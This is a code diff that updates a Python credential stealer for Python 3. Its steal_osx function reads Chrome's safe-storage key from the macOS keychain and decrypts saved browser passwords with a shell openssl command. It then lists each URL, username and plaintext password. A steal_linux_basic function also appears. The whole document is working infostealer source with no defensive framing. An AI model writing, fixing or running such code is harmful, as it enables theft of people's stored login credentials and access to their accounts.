@@ -63,7 +63,6 @@ def steal_linux_basic():
 	else:
 		# There are no saved passwords
 		return('[-] There are no saved passwords')
-# OSX part
 def steal_osx():
 	# Recovered list
 	recovered = list()
@@ -76,7 +75,7 @@ def steal_osx():
 					    stderr=subprocess.PIPE,
 					    shell=True)
 	stdout, stderr = safe_storage_key.communicate()
-	safe_storage_key = stdout.replace("\n", "")
+	safe_storage_key = stdout[:-1]
 	# Catch keychain errors
 	if stderr:
 		return("[-]Chrome entry not found in keychain.")
@@ -98,20 +97,10 @@ def steal_osx():
 			try:
 				if hex_enc_password:
 					# Decrpyt with OpenSSL
-					password = subprocess.check_output("openssl enc -base64 -d "
-									   "-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
-									   hex_enc_password+" 2>/dev/null",
+					decrpytCommand = "openssl enc -base64 -d -aes-128-cbc -iv '"+iv+"' -K "+hex_key.decode('utf-8')+" <<< "+hex_enc_password.decode('utf-8')+" 2>/dev/null"
+					password = subprocess.check_output(decrpytCommand,
 									   shell=True)
-					# If the URL is blank,print it as (Unknown)
-					if(len(result[0]) <= 0):
-						result[0] = "(Unknown)"
-					# If the username is blank,say so
-					if(len(result[1]) <= 0):
-						result[1] = "(Blank)"
-					# If the password is blank,say so
-					if(len(password) <= 0):
-						password = "(Blank)"
-					recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+					recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password.decode('utf-8')))
 			except subprocess.CalledProcessError:
 				pass
 		return recovered
